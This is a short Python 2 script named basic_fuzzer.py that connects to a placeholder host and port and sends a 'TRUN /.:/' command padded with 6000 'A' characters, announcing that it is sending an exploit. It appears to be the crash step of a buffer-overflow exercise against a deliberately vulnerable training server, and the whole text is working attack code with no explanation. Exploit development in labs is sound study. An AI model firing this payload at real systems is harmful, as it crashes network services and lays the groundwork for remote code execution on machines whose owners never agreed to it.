#!/usr/bin/python
# basic_fuzzer.py

import os
import sys
import socket

host = "$ip_address"
port = $PORT
buffer = "A" * 6000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)

print "[*] Sending exploit."
s.send("TRUN /.:/" + buffer)
print s.recv(1024)
s.close()
